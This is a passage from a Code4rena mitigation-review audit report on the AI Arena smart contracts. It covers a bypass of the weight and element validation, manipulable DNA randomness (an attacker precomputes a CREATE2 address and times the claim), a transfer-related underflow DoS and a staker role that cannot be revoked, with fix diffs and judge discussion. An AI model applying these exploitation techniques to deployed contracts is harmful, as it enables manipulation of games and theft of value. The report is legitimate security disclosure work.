            _customAttributes,
            uint32(totalRound - 1)
        );

        uint256 numRewards = _mergingPoolContract.getUnclaimedRewards(user1);
        assertEq(numRewards, 0);

        assertEq(_fighterFarmContract.balanceOf(user1), 4);
    }

Output:
emit FighterCreated(id: 5, weight: 99, element: 10, generation: 0)
```

However, M-03 is out of scope. I would just report that this risk is not mitigated.

### The wrong usage of index forces players to create and pass an array of `customAttributes`
Even if a player want to claim one reward, he/she has to pass to `MergingPool.claimRewards()` arrays with at least `winnersLength` elements, where `winnersLength` is the maximum value among `winnerAddresses[round].length` for analyzed rounds (i.e. rounds in the selected interval).

We suggest to change these two lines:

```diff
@@ -156,9 +156,9 @@ contract MergingPool is ReentrancyGuard{
             numRoundsClaimed[msg.sender] += 1;
             winnersLength = winnerAddresses[currentRound].length;
             for (uint32 j = 0; j < winnersLength; j++) {
-                require(customAttributes[j][0] < _fighterFarmInstance.numElements(generation), "MergingPool: elemen
t out of bounds");
-                require(customAttributes[j][1] >= 65 && customAttributes[j][1] <= 95, "MergingPool: weight out of b
ounds");
                 if (msg.sender == winnerAddresses[currentRound][j]) {
+                    require(customAttributes[claimIndex][0] < _fighterFarmInstance.numElements(generation), "
MergingPool: element out of bounds");
+                    require(customAttributes[claimIndex][1] >= 65 && customAttributes[claimIndex][1] <= 95, "
MergingPool: weight out of bounds");
                     _fighterFarmInstance.mintFromMergingPool(
                         msg.sender,
                         modelURIs[claimIndex],
```



***

## [M-03: Unmitigated](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/8)
*Submitted by [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/8), also found by [niser93](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/29)*

**Related to mitigation of:** [M-03: Fighter created by mintFromMergingPool can have arbitrary weight and element](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/932)

### Comments
When users minted new fighters through the MergingPool, validation for `weight` and `element` values, passed as input in the `customAttributes` array, was missing. Therefore, winners of MergingPool NFTs could arbitrarily assign any `weight` and `element` to their new fighters. 

### Mitigation
[PR #16](https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/16)

The fixed implemented introduces input validation for the custom attributes provided in `MergingPool::claimRewards`. `element` is required to be smaller than the total number of possible elements for the current generation, while `weight` is required to be in the [65, 95] range:

```solidity
require(customAttributes[j][0] < _fighterFarmInstance.numElements(generation), "MergingPool: element out of bounds");
require(customAttributes[j][1] >= 65 && customAttributes[j][1] <= 95, "MergingPool: weight out of bounds");
```

Users calling claimRewards provide one pair of customAttribute per claimable NFT. However, the `customAttributes` index [checked](https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/blob/d81beee0df9c5465fe3ae954ce41300a9dd60b7f/src/MergingPool.sol#L159-L160) is not the appropriate index `claimIndex` but the `winnerAddresses` index `j`. 

The most concerning consequence of this bug is that the custom attribute values could bypass the element and weight requirements if the custom attribute index for a given claim is greater than the max number of winners of the rounds iterated. For example, if there is 1 winner per round for several rounds in a row and a player wins two rounds, `customAttributes[1]` would not be checked and `customAttributes[0]` would be checked repeatedly.

### Suggestion
Change
```solidity
for (uint32 j = 0; j < winnersLength; j++) {
    require(customAttributes[j][0] < _fighterFarmInstance.numElements(generation), "MergingPool: element out of bounds");
    require(customAttributes[j][1] >= 65 && customAttributes[j][1] <= 95, "MergingPool: weight out of bounds");
    if (msg.sender == winnerAddresses[currentRound][j]) {
        _fighterFarmInstance.mintFromMergingPool(
            msg.sender,
            modelURIs[claimIndex],
            modelTypes[claimIndex],
            customAttributes[claimIndex]
        );
        claimIndex += 1;
    }
}
```
to:
```solidity
for (uint32 j = 0; j < winnersLength; j++) {
    if (msg.sender == winnerAddresses[currentRound][j]) {
        require(customAttributes[claimIndex][0] < _fighterFarmInstance.numElements(generation), "MergingPool: element out of bounds");
        require(customAttributes[claimIndex][1] >= 65 && customAttributes[claimIndex][1] <= 95, "MergingPool: weight out of bounds");
        _fighterFarmInstance.mintFromMergingPool(
            msg.sender,
            modelURIs[claimIndex],
            modelTypes[claimIndex],
            customAttributes[claimIndex]
        );
        claimIndex += 1;
    }
}
```

### Conclusion
The implemented mitigation is incorrect. In some scenarios, the element and weight values input in `MergingPool::claimRewards` could still be arbitrarily set, ignoring the intended input validation. 



***

## M-05: Unmitigated
*Submitted by [fnanni](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/5) and niser93 ([1](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/18), [2](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/17)), also found by d3e4 ([1](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/50), [2](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/54), [3](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/55))*

*Note: the content from two separate warden reports is included here, as the judge [noted](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/18#issuecomment-2080288440):*<br> 
> *[Issue #5](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/5) is the best among all reports related to the mitigations for `M-05`, and [issue #18](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/18) supplements it with details about the [issue of random number prediction in the original contest](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1017).*

### [Issue 5](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/5)

**Lines of code:**<br>
https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/blob/1192a55963c92fb4bd9ca8e0453c96af09731235/src/FighterFarm.sol#L366

https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/blob/1192a55963c92fb4bd9ca8e0453c96af09731235/src/MergingPool.sol#L142-L175

https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/blob/1192a55963c92fb4bd9ca8e0453c96af09731235/src/FighterFarm.sol#L425

https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/blob/1192a55963c92fb4bd9ca8e0453c96af09731235/src/FighterFarm.sol#L241

**Related to mitigation of:** [Issue 1017: Users can get benefited from DNA pseudorandomly calculation](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1017)

**Comments**<br>
Before, the pseudorandom derivation of new fighters' DNA was vulnerable to manipulation in several ways:
1. owner address manipulation in `FighterFarm::claimFighters` and `FighterFarm::reRoll`.
1. users could freely choose `mintPassDnas` values to pass to `FighterFarm::redeemMintPass`.
1. users could delay the minting of fighters till `fighters.length` resulted in a beneficial DNA in `FighterFarm::mintFromMergingPool` in `FighterFarm::claimFighters`.
1. it was possible to know in advance which re-roll would result in the best DNA in `FighterFarm::reRoll`, because of `numRerolls[tokenId]` being used to generate the DNA hash.

**Mitigation**<br>
[PR #11](https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/11)<br>
This issue has been only partially mitigated.

**`FighterFarm::redeemMintPass`**<br>
There's one instance in which the mitigation works. `FighterFarm::redeemMintPass` now relies on a trusted `_delegatedAddress` which controls what parameters are being used, including the `mintPassDnas` values which are `keccak256` hashed into DNAs. This fix was introduced as mitigation of H-03.

**`FighterFarm::claimFighters`**<br>
On the other hand, `FighterFarm::claimFighters` now relies as well on a trusted `_delegatedAddress`, but it signs:

```solidity
bytes32 msgHash = bytes32(keccak256(abi.encode(
    msg.sender, 
    numToMint[0], 
    numToMint[1],
    nftsClaimed[msg.sender][0],
    nftsClaimed[msg.sender][1]
)));
```

and then `msg.sender`, `nftsClaimed[msg.sender][0]` and `nftsClaimed[msg.sender][1]` are used to generate the DNA hash. In all scenarios in which msg.sender could be manipulated, for example if promotional campaigns are run in which users could precompute and use the address resulting in the best DNA, the issue remains unmitigated. Note that `nftsClaimed[msg.sender]` values of newly generated addresses are always 0 and `numToMint` could probably be known or assumed in advance.

Another consequence of the fix that seems incorrect is that all fighters minted within a `FighterFarm::claimFighters` call will have the same DNA, because `msg.sender`, `nftsClaimed[msg.sender][0]` and `nftsClaimed[msg.sender][1]` don't change among iterations in:
```solidity
for (uint16 i = 0; i < totalToMint; i++) {
    _createNewFighter(
        msg.sender, 
        uint256(keccak256(abi.encode(msg.sender, nftsClaimed[msg.sender][0], nftsClaimed[msg.sender][1]))),
        modelHashes[i], 
        modelTypes[i],
        i < numToMint[0] ? 0 : 1,
        0,
        [uint256(100), uint256(100)]
    );
}
```
Note that previously `fighter.length` would increase as each fighter was minted, and therefore each fighter would have a different DNA.

**`FighterFarm::mintFromMergingPool`**<br>
`FighterFarm::mintFromMergingPool` now sets the new dna to `uint256(keccak256(abi.encode(to, fighters.length)))`, making the dna dependent on the current amount of fighters and the user address. Using `to` is relatively safe, taking into account that winners of NFTs in the MergingPool raffle would have to play the game for probably a long time before they win, so manipulating the address in advance would require a lot of speculation on several variables they don't control.

However, users calling this function have full control regarding when to call `MergingPool::claimRewards`. This means that users can delay the claim till `fighters.length` results in a DNA they like, which can be accomplished by pre-computing the expected DNAs for all the following `fighters.length` values.

**`FighterFarm::reRoll`**<br>
In this case `msg.sender` is no longer used for the DNA generation, but it is vulnerable since it still uses `tokenId` and `numRerolls[tokenId]`. `tokenId` is to some extent manipulable, because ids are incremental and users claiming new fighters have full control of when they execute the claim. Additionally, all possible re-rolling DNAs could be calculated in order to know which one will be the best one. 

With this information, players could choose to some degree the token ID of their new fighter and re-roll it up to `maxRerollsAllowed` times until they get their desired DNA. There could even be a front-running madness scenario for claiming new fighters with exceptionally good token IDs, since re-rolled DNAs depend on token ID and amount of re-rolls.

**Suggestion**<br>
1. Don't use the current amount of minted fighters (`fighters.length`) as a randomness source, since users could take advantage of it and speculate on dnas they could get if they wait for minting.
2. Speculating on `fighters.length` also means that user can speculate on token IDs. Avoid using token IDs for DNA re-rolling, since it can be manipulated to some degree.
3. Avoid using `msg.sender` in `FighterFarm::claimFighters`.

**Conclusion**<br>
The mitigation does not fully solve the DNA generation issues.

### [Issue 18](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/18)

**Old lines of code:** https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/FighterFarm.sol#L324

**Mitigated lines of code:** https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/blob/setUpAirdrop-mitigation/src/FighterFarm.sol#L366

**Vulnerability details**<br>
The issue was reported in [#578](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/578) and [#1017](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1017).

The vulnerability is inside [FighterFarm.mintFromMergingPool()](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/FighterFarm.sol#L307-L331):

```
FighterFarm.sol#L307-L331

307      /// @notice Mints a new fighter from the merging pool.
308      /// @dev Only the merging pool contract address is authorized to call this function.
309      /// @param to The address that the new fighter will be assigned to.
310      /// @param modelHash The hash of the ML model associated with the fighter.
311      /// @param modelType The type of the ML model associated with the fighter.
312      /// @param customAttributes Array with [element, weight] of the newly created fighter.
313      function mintFromMergingPool(
314          address to, 
315          string calldata modelHash, 
316          string calldata modelType, 
317          uint256[2] calldata customAttributes
318      ) 
319          public 
320      {
321          require(msg.sender == _mergingPoolAddress);
322          _createNewFighter(
323              to, 
324              uint256(keccak256(abi.encode(msg.sender, fighters.length))), 
325              modelHash, 
326              modelType,
327              0,
328              0,
329              customAttributes
330          );
331      }
```

This function can be called only by the `merging pool contract`. This means that `msg.sender` must be `_mergingPoolAddress`.

However, `msg.sender` is also used as `dna` parameter of `_createNewFighter()` (line [L324](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/FighterFarm.sol#L324)). 

**Impact**<br>
Even if an attacker can't exploit this bad randomness to obtain better fighters, players could forecast the attributes of fighters that will be created in the future, due to the bad randomness caused by this issue.

**Recommended Mitigation proposed by wardens**<br>
The mitigation proposal is to replace `msg.sender` in line [L324](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/FighterFarm.sol#L324) with the address `to`, that should represents the player who calls [MergingPool.claimRewards()](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/MergingPool.sol#L139-L167):

```diff
FighterFarm.sol#L307-L331

/// @notice Mints a new fighter from the merging pool.
/// @dev Only the merging pool contract address is authorized to call this function.
/// @param to The address that the new fighter will be assigned to.
/// @param modelHash The hash of the ML model associated with the fighter.
/// @param modelType The type of the ML model associated with the fighter.
/// @param customAttributes Array with [element, weight] of the newly created fighter.
function mintFromMergingPool(
    address to, 
    string calldata modelHash, 
    string calldata modelType, 
    uint256[2] calldata customAttributes
) 
    public 
{
    require(msg.sender == _mergingPoolAddress);
    _createNewFighter(
        to, 
-       uint256(keccak256(abi.encode(msg.sender, fighters.length))),
+       uint256(keccak256(abi.encode(to, fighters.length))), 
        modelHash, 
        modelType,
        0,
        0,
        customAttributes
    );
}
```

[This solution was implemented by the Ai Arena team](https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/3/commits/6d38b3cb03ff2cb2a27ea346d27588143fb893f4).

**Comment about the Mitigation Proposal**<br>
This finding belongs to a group of issues that reported the low randomness of dna. Two of the most important are [#53](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/53) and [#519](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/519). The root cause is that `msg.sender` can be a bad source of randomness because an attacker could create a malicious contract at the wanted address using, for example, [Create2](https://docs.alchemy.com/docs/create2-an-alternative-to-deriving-contract-addresses).

In the case above, before the mitigation, nobody could exploit the vulnerability, because the `msg.sender` value was always the `_mergingPoolAddress`. After the mitigation, the `dna` of the new fighter relies on the caller's address. So, the mitigation could introduce the possibility of manipulating the `msg.sender` address and obtaining wanted attributes.

**Attack Vector**<br>
Let's think that before the current round, `fighters.length` into [FighterFarm.sol](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/FighterFarm.sol#L69) is 0. Eve locally tries many combinations and finds that the tuple `(address_E, fighters.length=3)` permits creating a very rare fighter: Eve can forecast this is because she can exploit the line [FighterFarm.sol#214](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/FighterFarm.sol#L214):

```
FighterFarm.sol#214

214                  uint256(keccak256(abi.encode(msg.sender, fighters.length))),
```

to obtain `dna` and then use its value to precompute the new fighter's physical attributes:

```
FighterFarm.sol#L510-L515

510          FighterOps.FighterPhysicalAttributes memory attrs = _aiArenaHelperInstance.createPhysicalAttributes(
511              newDna,
512              generation[fighterType],
513              iconsType,
514              dendroidBool
515          );
```

Now, Eve creates a new contract at `address_E` and tries to win the current round (for example using a new fighter redeemed with a mint pass).
If she wins, she could call `MergingPool.claimRewards()` just after someone else has obtained the fighter number 3 (in other words, when fighters.length=3).

We know this attack vector could be hard to perform, but we have to report the consequences of mitigation. To solve the bad randomness introduced by this mitigation, we propose to implement something like [FighterFarm.redeemMintPass()](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/FighterFarm.sol#L233) where the `dna` is obtained from an external source (for example, from a backend server) and cannot be manipulated by the caller.

**Conclusions**<br>
In conclusion, the proposed mitigation solves the initial bad randomness due to too little `dna` combinations space. However, it doesn't solve the issue reported by [#1017](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/1017):

```
In this function a user can not manipulate the output hash, however, he can compute the hash for the upcoming fighters, 
because when a new fighter is created, the fighters.length will change along with the output hash. As a result, 
a user can claim the MergingPool reward to mint and NFT when the output hash will be benefitial for him.
```

The malicious user can still forecast the outcome fighter attributes and claim the MergingPool reward when it is more convenient for him/her. Furthermore, it introduces the possibility to manipulate the `msg.sender` value to obtain a wanted `dna` and, so, a fighter with wanted valuable and rare attributes. We are going to report this comment as "unmitigated" and the attack vector above as a "new finding".



***

## [M-06: Unmitigated](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/51)
*Submitted by [d3e4](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/51)*

**Related to mitigation of:** [M-06: NFTs can be transferred even if StakeAtRisk remains, so the user's win cannot be recorded on the chain due to underflow, and can recover past losses that can't be recovered (steal protocol's token)](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/137)

There are two possibilities of revert due to underflow triggered in `RankedBattle.updateBattleRecord()`.
1. In `RankedBattle._addResultPoints_()`: [`accumulatedPointsPerAddress[fighterOwner][roundId] -= points`](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/RankedBattle.sol#L486). The impact is that a fighter with accumulated points, which is transferred to a new address cannot be recorded in a loss. 
2. In `StakeAtRisk.reclaimNRN()`: [`amountLost[fighterOwner] -= nrnToReclaim;`](https://github.com/code-423n4/2024-02-ai-arena/blob/cd1a0e6d1b40168657d1aaee8223dc050e15f8cc/src/StakeAtRisk.sol#L104). The impact is that a fighter with some stake at risk cannot be recorded in a win until it has lost.

Both of the above only apply to the round in which the fighter was transferred.

There was also an impact reported that a transferred fighter could be used to reclaim losses from a previous round. I consider this aspect invalid, since the new owner cannot gain more than the old owner could (re)gain. It might however be considered an issue that a fighter with stake at risk can be transferred since this is almost the same as transferring a staked fighter. This does not quite seem to be the initial issue reported, but it [is fixed anyway by fix 1490](https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/14/files#diff-bcde603c412d351d31a22361f1593f9d9ac1e73c65754d4dda3e80033aa0e415R293).

### Mitigation review - mootly mitigated and causes an even worse DoS
A new variable `addressStartedRound[tokenId][roundId]` has been added, with [a check that reverts if the owner of the `tokenId` has changed from a previous call in the round](https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/blob/d81beee0df9c5465fe3ae954ce41300a9dd60b7f/src/RankedBattle.sol#L375-L380). That is, only fights under the first owner can be updated.
So this now reverts in a superset of the original cases. It balances the exploitability for profit, but now any fighter transfer will cause a DoS of the game server trying to call `updateBattleRecord()`. If a fighter is transferred then all matches with this fighter will lead to a revert. This can be quite significant. If fighters are paired at random and 10% of fighters have been transferred then over 19% of all matches will revert. Since there is no time in between rounds, this will be an issue whenever a fighter is transferred. The round id is also not emitted when a fighter is transferred so it would be difficult for the game server to fairly exclude transferred fighters.

This is perhaps an error rather than a failed mitigation, but since this error renders the initial issue moot, I leave it here as an unmitigated M-06 rather than reporting it as an error separately.

### Recommended Mitigation Steps
It seems the intention is to lock a fighter as long as it is staked on, but otherwise freely allow transfers.

`accumulatedPointsPerAddress` and `amountLost` are just convenience variables, and never used for validation. They could simply be removed, or it would make sense to make them signed integers. That would be sufficient to mitigate this underflow revert.

The issue that a fighter can be transferred with stake at risk has been fixed independently [in fix 1490](https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/pull/14/files#diff-bcde603c412d351d31a22361f1593f9d9ac1e73c65754d4dda3e80033aa0e415R293), rather than fix 137. Now a fighter has to be completely clear of stake and stake at risk in order to be transferred.

Thus removing the [`addressStartedRound` check](https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/blob/d81beee0df9c5465fe3ae954ce41300a9dd60b7f/src/RankedBattle.sol#L375-L380) and instead making `accumulatedPointsPerAddress` and `amountLost` signed integers, or just removing them, solves all these issues related to M-06.

**[ronnyx2017 (judge) commented](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/51#issuecomment-2067672586):**
 > Makes sense IMO.

**[brandinho (AI Arena) commented](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/51#issuecomment-2097297149):**
 > The conclusion that our mitigation will result in a worse DoS is incorrect. It is based on a number of assumptions that are wrong:
> 
> 1. "Since there is no time in between rounds". This is wrong - for the mitigation review, we introduced `rankedOpen` variable in the Ranked Battle smart contract to specifically allow for time in between rounds.
> 2. "The round id is also not emitted when a fighter is transferred so it would be difficult for the game server to fairly exclude transferred fighters". This is also wrong in the sense that it's difficult to exclude transferred fighters. We can easily do this with two multi-calls: `ownerOf` and `addressStartedRound`. We've been running similar exclusion multi-calls on testnet for months now - our tests were with thousands of NFTs on testnet. When we launch on mainnet, we are launching with 420 NFTs, and having low double digit inflation in NFTs per year. The multi-calls will always be manageable for excluding transferred fighters.
> 3. "If a fighter is transferred then all matches with this fighter will lead to a revert". This assumes that we will allow these matches - we will **not**.
> 4.  Players can ONLY initiate ranked battle through our app. They cannot interact with the game server directly. We already block attempts to initiate ranked battle if a fighter has been transferred, and inform the user that they have to wait until the next round.
> 
> As such, I believe we did appropriately mitigate this issue.

**[ronnyx2017 (judge) commented](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/51#issuecomment-2100934943):**
 > If our close-source backend indeed perfectly limits the above mentioned issues, then I think our mitigation is good.<br>
> However, I believe that Warden's judgments and speculations based on the on-chain open-source code are completely in line with a reasonable client design.
> 1. rankedOpen: its a flag like enable/disable, instead of a time locker. Without the context of the backend code, I believe no one knows this is a "time locker".
> 2. If its only for 420 NFTs, indeed, it will not be dragged down by long connections. But there has never been such a hard cap in the open source on-chain code. The warden's suggestion is based on reasonable assumptions from normal client development.
> 
> In summary, in the context of the open-source on-chain code of the contest, this issue makes sense.<br>
> If we believe that we have implemented sufficient restrictions in our backend code to avoid all this, then indeed we can believe that we have fixed the issue. However, these codes have now moved beyond the context of the current codebase of the contest, IMO.



***

## [M-08: Unmitigated](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/52)
*Submitted by [d3e4](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/52)*

**Related to mitigation of:** [M-08: Burner role can not be revoked](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/47)

The issues were that the burner role in GameItems.sol, and the staker role in FighterFarm.sol (see duplicate [#710](https://github.com/code-423n4/2024-02-ai-arena-findings/issues/710)) cannot be revoked.

### Mitigation review - only case of burner role fixed
`setAllowedBurningAddresses()` in GameItems.sol has been replaced by an [`adjustBurningAccess()`](https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/blob/1192a55963c92fb4bd9ca8e0453c96af09731235/src/GameItems.sol#L194-L197).

The staker role in FighterFarm.sol still can only be [added](https://github.com/ArenaX-Labs/2024-02-ai-arena-mitigation/blob/1192a55963c92fb4bd9ca8e0453c96af09731235/src/FighterFarm.sol#L151).

### Recommended mitigation steps
Similarly implement an `adjustStakerAccess()` instead for the staker role in FighterFarm.sol.

*Note: for full discussion, see warden's [original submission](https://github.com/code-423n4/2024-04-ai-arena-mitigation-findings/issues/52).*



***

# Disclosures

C4 is an open organization governed by participants in the community.

C4 audits incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Audit submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
